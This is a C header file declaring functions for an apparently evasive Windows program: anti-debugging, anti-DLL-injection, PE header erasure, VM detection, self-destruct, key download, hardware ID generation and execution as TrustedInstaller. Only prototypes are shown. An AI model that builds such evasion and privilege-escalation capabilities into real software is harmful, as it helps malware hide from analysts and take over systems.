#pragma once
#pragma comment(linker, "\"/manifestdependency:type='win32' \
name='Microsoft.Windows.Common-Controls' version='6.0.0.0' \
processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

#include "resource.h"
#include "..\shared\depends.h"

/* WinMain : main.c */
VOID ESelfDestruct();

/* Xoshiro PRNG Algorithm : Xoshiro.c */
BOOL EXoshiroBegin(_In_opt_ PDWORD dwState);
VOID EXoshiroEnd(_In_opt_ PDWORD dwState);

DWORD EXoshiroSS(_In_opt_ PDWORD dwState);
DWORD EXoshiroP(_In_opt_ PDWORD dwState);
UINT FASTCALL ERandomIntDistribution(_In_opt_ PDWORD dwState, _In_ UINT uiMin, _In_ UINT uiMax);
FLOAT ERandomRealDistribution(_In_opt_ PDWORD dwState);

/* Anti-ReverseEngineering : AntiDebug.c, AnitDllInject.c, AntiRE.c */
BOOL fnAntiRE();
BOOL IAntiDebug();
BOOL IAntiDllInject();
BOOL EHideThread(_In_opt_ HANDLE hThread);
BOOL fnErasePeHeader();

/* VMDetection : VMDetect.c */
BOOL ICheckVmPresent();

/* ConsoleHost : Console.c */
BOOL IOpenConsole();
STATUS EPrintFW(_In_ PCWSTR pText, _In_opt_ WORD wAttribute, _In_opt_ ...);

/* NT Functions : NT.c */
BOOL EAdjustPrivilege(_In_ PCWSTR lpszPrivilege, _In_ BOOL bEnablePrivilege);

/* FileSystem Tools : FileSytsem.c */
PVOID AllocReadFileW(_In_ PCWSTR szFileName, _Out_ PSIZE_T nFileSize);
BOOL WriteFileCW(_In_ PCWSTR pFileName, _In_ PVOID pBuffer, _In_ SIZE_T nBuffer);
PCWSTR GetFileNameFromPathW(_In_ PCWSTR pPath);

/* Random : Random.c */
VOID EGenRandomB64W(_In_opt_ PDWORD dwState, _Out_ PVOID sz, _In_ SIZE_T n);
VOID EGenRandomPathW(_In_opt_ PDWORD dwState, _Out_ PVOID sz, _In_ SIZE_T n);
PCWSTR EAllocRandomBase64StringW(_In_opt_ PDWORD dwState, _In_ SIZE_T nMin, _In_opt_ SIZE_T nMax);
PCWSTR EAllocRandomPathW(_In_opt_ PDWORD dwState, _In_ SIZE_T nMin, _In_opt_ SIZE_T nMax);
VOID EGenRandom(_In_opt_ PDWORD dwState, _Out_ PVOID pBuffer,_In_ SIZE_T nBuffer);

/* Utils and Other : Utils.c*/
BOOL IIsUserAdmin();
PVOID ELoadResourceW(_In_ WORD wResID, _In_ PCWSTR pResType, _Out_ PSIZE_T nBufferSize);
PVOID IDownloadKey();
VOID IGenerateHardwareId(_Out_ PUUID pHwId);
VOID IGenerateSessionId(_Out_ PUUID pHWID);
BOOL ERunAsTrustedInstaller(_In_ PCWSTR szFileName, _In_ PCWSTR szCmdLine, _In_opt_ PCWSTR szDirectory);
